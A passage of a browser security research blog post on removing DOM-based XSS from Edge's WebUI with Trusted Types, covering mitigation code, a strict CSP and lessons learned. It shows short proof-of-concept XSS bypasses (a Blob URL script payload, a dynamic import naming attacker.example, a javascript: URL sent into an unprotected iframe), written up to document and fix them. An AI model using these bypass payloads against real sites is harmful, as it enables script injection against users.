</pre></table></code></div></div><p>This enforces secure coding practice, where developers are required to use one of the following options:</p><ol><li>Write code with safe DOM APIs (e.g. use <em>createElement</em> and <em>appendChild</em> instead of <em>innerHTML</em>).</li><li>Create a Trusted Type policy where you can sanitize an input.</li></ol><p><a href="https://web.dev/trusted-types/#create-a-trusted-type-policy">Example</a>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>// Content-Security-Policy: require-trusted-types-for 'script';

const escapeHTMLPolicy = trustedTypes.createPolicy('myEscapePolicy', {
  createHTML: string =&gt; string.replace(/\&lt;/g, '&amp;lt;')
});

// Success because input is sanitized through a Trusted Type policy
document.body.innerHTML = escapeHTMLPolicy.createHTML('&lt;img src=x onerror=alert(1)&gt;');
</pre></table></code></div></div><p>This surprisingly simple mechanism can help defeat DOM-based XSS, because we can ensure that all assignments to dangerous sinks go through sanitization. Which means as long as the sanitization in Trusted Type policies are solid, there won‚Äôt be a DOM-based XSS.</p><h1 id="can-we-trust-trusted-types">Can we trust Trusted Types?</h1><p>When I see a security feature, the first thing I do is to test it üòä And I was able to find a few ways to bypass Trusted Types (some were known).</p><h2 id="platform-level-bypasses">Platform-level bypasses</h2><h3 id="blob-url">Blob URL</h3><p>When creating a Blob URL, an attacker-controlled string may be used depending on the Web application.</p><p>Example:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>let attackerControlledString = '&lt;script&gt;alert(document.domain)&lt;\/script&gt;';
const  html = '&lt;h1&gt; Hello ' + attackerControlledString + '!&lt;/h1&gt;';
const  blob = new Blob([html], {type: 'text/html'});
const  url = URL.createObjectURL(blob);
location = url; // XSS
</pre></table></code></div></div><p>While it seems like the string assignment to <code class="language-plaintext highlighter-rouge">Blob</code> object needs Trusted Types enforcement, it‚Äôs difficult to enforce it because:</p><ol><li>The <code class="language-plaintext highlighter-rouge">type</code> argument can be something safe (e.g. <code class="language-plaintext highlighter-rouge">text/plain</code>) or something unknown (maybe <code class="language-plaintext highlighter-rouge">application/signed-exchange</code> in the future?).</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/URL/createObjectURL"><code class="language-plaintext highlighter-rouge">URL.createObjectURL</code></a> also accepts <a href="https://developer.mozilla.org/en-US/docs/Web/API/File"><code class="language-plaintext highlighter-rouge">File</code></a> object and <a href="https://developer.mozilla.org/en-US/docs/Web/API/MediaSource"><code class="language-plaintext highlighter-rouge">MediaSource</code></a> object.</li></ol><p>I reported <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=933171">this bug</a>, but it remains unpatched at the time of writing (probably due to the complexity). Conclusion here is that we should probably <a href="https://github.com/w3c/FileAPI/issues/74">change Blob URL to something safe</a> üòä</p><h3 id="script-loading-like-import">Script loading like <code class="language-plaintext highlighter-rouge">import</code></h3><p><a href="https://github.com/w3c/webappsec-trusted-types/issues/232">Non-DOM API based script loading</a> aren‚Äôt currently enforced by Trusted Types.</p><p>Example:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>let  attackerControlledString = '/attacker.example/exploit';
import(`/${attackerControlledString}.js`); // XSS
</pre></table></code></div></div><p>While this isn‚Äôt ideal, this can be mitigated by setting CSP <code class="language-plaintext highlighter-rouge">script-src</code> with allow-list of origins/URLs (which WebUI does by default).</p><h2 id="application-specific-bypass">Application specific bypass</h2><h3 id="cross-document-vectors">Cross-document vectors</h3><p>As the <a href="https://w3c.github.io/webappsec-trusted-types/dist/spec/#cross-document-vectors">Trusted Types specification</a> indicates, interaction of 2 documents might bypass a Trusted Types if one of them doesn‚Äôt have a Trusted Types enforced. While this sounds obvious, it‚Äôs an interesting vector because of how Trusted Types handles a JavaScript URL.</p><p>When a JavaScript URL is assigned to <code class="language-plaintext highlighter-rouge">HTMLAnchorElement.href</code>, <code class="language-plaintext highlighter-rouge">HTMLIFrameElement.src</code>, etc, it results in a DOM-based XSS. However, Trusted Types doesn‚Äôt block assignments of JavaScript URL to those sinks. Instead, it blocks the navigation to a JavaScript URL if the Trusted Types is enforced in the document (just like how CSP‚Äôs <code class="language-plaintext highlighter-rouge">script-src</code> blocks a JavaScript URL).</p><p>This means the following cross-document interaction becomes vulnerable.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>&lt;!-- this application allows embedding iframe with any https: website and any name attribute --&gt;
&lt;iframe src="/robots.txt" name="new"&gt;&lt;/iframe&gt;

&lt;script&gt;
  let  attackerControlledString = 'javascript:alert(origin)';
  const a = document.createElement('a');
  a.href = attackerControlledString;
  a.target = 'new';
  a.textContent = 'Open new window';
  document.body.appendChild(a);
&lt;/script&gt;
</pre></table></code></div></div><p>If the <code class="language-plaintext highlighter-rouge">robots.txt</code> doesn‚Äôt have Trusted Types enforced, clicking the JavaScript URL link will result in a DOM-based XSS, because the JavaScript URL will execute in the document of <code class="language-plaintext highlighter-rouge">robots.txt</code> iframe.</p><p>This is not only an issue in Trusted Types, but it has been <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=764518">a known issue</a> for a while in CSP. And <a href="https://wicg.github.io/origin-policy/">Origin Policy</a> tries to tackle this problem by serving a default policy headers for all pages in the origin.</p><p>This issue can be mitigated by enforcing Trusted Types or CSP <code class="language-plaintext highlighter-rouge">script-src</code> on every page (which WebUI does by default).</p><h1 id="deploying-perfect-types">Deploying Perfect Types</h1><p>Given that Trusted Types only has few bypasses and most of them can be mitigated, I‚Äôve made contributions to Chromium and deployed <a href="https://source.chromium.org/chromium/chromium/src/+/master:content/public/browser/url_data_source.cc;l=87-90;drc=509e38f01cdecd231693bb590121319e90b93ec9">Perfect Types</a> to <a href="https://chromium-review.googlesource.com/c/chromium/src/+/2353547">WebUI by default</a>.</p><p>Perfect Types is a Trusted Types enforcement that doesn‚Äôt allow any Trusted Type policy creation.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Content-Security-Policy: require-trusted-types-for 'script'; trusted-types 'none';
</pre></table></code></div></div><p>This guarantees that the page doesn‚Äôt use any dangerous sinks, and therefore the page is DOM-XSS free üòä Of course, some WebUI does require Trusted Type policy, which we have reviewed and only allowed reviewed policies via <code class="language-plaintext highlighter-rouge">trusted-types</code> response header.</p><p>Unfortunately, many WebUI in Chromium use Polymer, which <a href="https://github.com/Polymer/polymer/issues/5648">does not support Trusted Types</a> yet. But coincidentally, the Edge Browser Experience team refactored most of the user facing WebUI in Edge using React, which supports Trusted Types. Therefore, Trusted Types is enabled on all the core WebUI in Edge (e.g. edge://settings, edge://downloads, edge://history, edge://print, etc), where I had to disable Trusted Types in Chromium due to Polymer.</p><h1 id="the-future-work">The Future work</h1><p>Some WebUI pages required Trusted Type policy because of <a href="https://chromium-review.googlesource.com/c/chromium/src/+/2176974/11/ui/webui/resources/js/cr/ui/tree.js">static string assignment to dangerous sinks</a> or <a href="https://chromium-review.googlesource.com/c/chromium/src/+/2215701/10/ui/webui/resources/js/parse_html_subset.js">use of a sanitizer</a>.</p><p>The static string assignment is especially a problem for JS libraries. For example, if a JS library wants to convert the following code to be compatible with Trusted Types without Trusted Type policy:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>document.body.innerHTML += '&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;Hello World!!&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;';
</pre></table></code></div></div><p>The following is how they need to do it today:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>const table = document.createElement('table');
const tbody = document.createElement('tbody');
const tr = document.createElement('tr');
const td = document.createElement('td');
td.textContent = 'Hello World!!';
tr.appendChild(td);
tbody.appendChild(tr);
table.appendChild(tbody);
document.body.appendChild(table);
</pre></table></code></div></div><p>The conversion increases the amount of code and makes the code less readable, even though it‚Äôs definitely a safe HTML.</p><p>Therefore, I believe that such a Trusted Type policy can be simplified or removed, if we can guarantee that those won‚Äôt cause an XSS. Thankfully, <a href="https://github.com/WICG/sanitizer-api/">Sanitizer API</a> aims to expose an ever-green XSS free sanitizer natively in the browsers. We are involved in the discussion of Sanitizer API so that it‚Äôll integrate well with Trusted Types, and hopefully reduce the necessity of Trusted Type policy creation to minimal. This will reduce both time and amount of coding required for developers, and security code audit required for new Trusted Type policy.</p><h1 id="takeaways">Takeaways</h1><p>There were a few lessons I learned.</p><p>First, while we invest a lot in fuzzing, static analysis, and other automation to scale bug findings, sometimes moving to secure coding practices like Trusted Types is the right answer. While we had to contribute to a few libraries (such as <a href="https://github.com/bvaughn/react-virtualized/releases/tag/v9.22.3">react virtualized</a>), converting code to be compatible with Trusted Types was much better than writing a tool to detect potential XSS (which is difficult üòã). Going forward, we will need to choose a third-party library that supports Trusted Types (or we will contribute to it). And I hope that Trusted Types support for libraries/frameworks will be important for every site, as deployment of Trusted Types grows.</p><p>Second, security feature support in WebKit does matter to Chromium users. Unfortunately, bugs like <a href="#xss-on-ssl-error-page">XSS on the SSL error page</a> will be exploitable on iOS even after enabling Trusted Types, because WebKit doesn‚Äôt support Trusted Types.</p><p>Third, understanding the pain points of converting existing code to Trusted Types was a net positive experience. I was able to get a feeling for how a developer‚Äôs day looks, and see how they strike a balance between security, code complexity, readability, and ease of conversion. Hopefully, this experience will help shape the better integration of Sanitizer API with Trusted Types.</p><h1 id="conclusion">Conclusion</h1><p>With the help of Trusted Types, we were able to mitigate DOM-based XSS in most of Edge‚Äôs WebUI. And due to the nature of WebUI which only serves static HTML or JS files, most of Edge‚Äôs WebUI is now XSS free in Edge 90 üòä I‚Äôm excited to see what will be the next bug class in WebUI after solving XSS!</p><p>If you are interested in finding bugs on WebUI, you can take a look at the list of WebUI in <a href="edge://about">edge://about</a> or in <a href="https://source.chromium.org/chromium/chromium/src/+/master:chrome/browser/ui/webui/chrome_url_data_manager_browsertest.cc;l=176;drc=f3c2c8d2fff648ef78f520f823aeaae48ac7ec4c">kChromeUrls</a>.</p><p>I would like to thank <a href="https://twitter.com/kkotowicz">Koto</a> and the rest of the Google Security team who invented Trusted Types, as well as <a href="https://twitter.com/mikewest">Mike West</a>, Demetrios, and the rest of the Chromium team who helped me contribute to Chromium.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/edgevr/categories/vulnerabilities/'>Vulnerabilities</a>, <a href='/edgevr/categories/mitigations/'>Mitigations</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/edgevr/tags/trusted-types/" class="post-tag no-text-decoration" >Trusted Types</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Eliminating XSS from WebUI with Trusted Types - Microsoft Browser Vulnerability Research&url=https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Eliminating XSS from WebUI with Trusted Types - Microsoft Browser Vulnerability Research&u=https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Eliminating XSS from WebUI with Trusted Types - Microsoft Browser Vulnerability Research&url=https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/edgevr/posts/Introducing-Enhanced-Security-for-Microsoft-Edge/">Introducing Enhanced Security for Microsoft Edge</a></li><li><a href="/edgevr/posts/Super-Duper-Secure-Mode/">Super Duper Secure Mode</a></li><li><a href="/edgevr/posts/attacking-the-devtools/">Guest Blog Post - Attacking the DevTools</a></li><li><a href="/edgevr/posts/eliminating-xss-with-trusted-types/">Eliminating XSS from WebUI with Trusted Types</a></li><li><a href="/edgevr/posts/Hacking-Chrome-iOS/">iOS Chromium Overlooked and Underappreciated</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/edgevr/tags/tips/">tips</a> <a class="post-tag" href="/edgevr/tags/site-isolation/">Site Isolation</a> <a class="post-tag" href="/edgevr/tags/jit/">JIT</a> <a class="post-tag" href="/edgevr/tags/ios/">iOS</a> <a class="post-tag" href="/edgevr/tags/fuzzing/">fuzzing</a> <a class="post-tag" href="/edgevr/tags/ui/">UI</a> <a class="post-tag" href="/edgevr/tags/trusted-types/">Trusted Types</a> <a class="post-tag" href="/edgevr/tags/memory-corruption/">Memory Corruption</a> <a class="post-tag" href="/edgevr/tags/headlines/">Headlines</a> <a class="post-tag" href="/edgevr/tags/devtools/">DevTools</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/edgevr/posts/deep-dive-into-site-isolation-part-2/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2020 Cotes Chung MIT License --> <span class="timeago small" > Dec 28, 2020 <i class="unloaded">2020-12-28T09:25:00-08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Deep Dive into Site Isolation (Part 2)</h3><div class="text-muted small"><p> In the previous blog post, I explained how Site Isolation and related security features help mitigate attacks such as UXSS and Spectre. However, security bugs in a renderer process are really commo...</p></div></div></a></div><div class="card"> <a href="/edgevr/posts/yet-another-uaf/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2020 Cotes Chung MIT License --> <span class="timeago small" > Mar 2, 2021 <i class="unloaded">2021-03-02T08:00:00-08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Yet another RenderFrameHostImpl UAF</h3><div class="text-muted small"><p> Introduction Back in 2020 while reviewing Chromium code, I found issue 1068395, a Use-After-Free in Browser Process that can be used to escape the Chromium sandbox on Android Devices. This is an i...</p></div></div></a></div><div class="card"> <a href="/edgevr/posts/ui-security-thinking-outside-the-viewport/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2020 Cotes Chung MIT License --> <span class="timeago small" > Jun 2, 2021 <i class="unloaded">2021-06-02T07:00:00-07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>UI Security - Thinking Outside the Viewport</h3><div class="text-muted small"><p> Introduction When it comes to an application‚Äôs user interface (UI), one may care for the aesthetics, design consistency, simplicity, and clarity to ensure a good UI. However, an application like a...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/edgevr/posts/yet-another-uaf/" class="btn btn-outline-primary"><p>Yet another RenderFrameHostImpl UAF</p></a> <a href="/edgevr/posts/ui-security-thinking-outside-the-viewport/" class="btn btn-outline-primary"><p>UI Security - Thinking Outside the Viewport</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> ¬© 2022 <a href="https://twitter.com/MSEdgeDev">Microsoft Corporation</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/">Chirpy</a> theme.</p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/edgevr/tags/tips/">tips</a> <a class="post-tag" href="/edgevr/tags/site-isolation/">Site Isolation</a> <a class="post-tag" href="/edgevr/tags/jit/">JIT</a> <a class="post-tag" href="/edgevr/tags/ios/">iOS</a> <a class="post-tag" href="/edgevr/tags/fuzzing/">fuzzing</a> <a class="post-tag" href="/edgevr/tags/ui/">UI</a> <a class="post-tag" href="/edgevr/tags/trusted-types/">Trusted Types</a> <a class="post-tag" href="/edgevr/tags/memory-corruption/">Memory Corruption</a> <a class="post-tag" href="/edgevr/tags/headlines/">Headlines</a> <a class="post-tag" href="/edgevr/tags/devtools/">DevTools</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2017-2019 Cotes Chung MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', '', 'auto'); ga('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/edgevr/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://microsoftedge.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
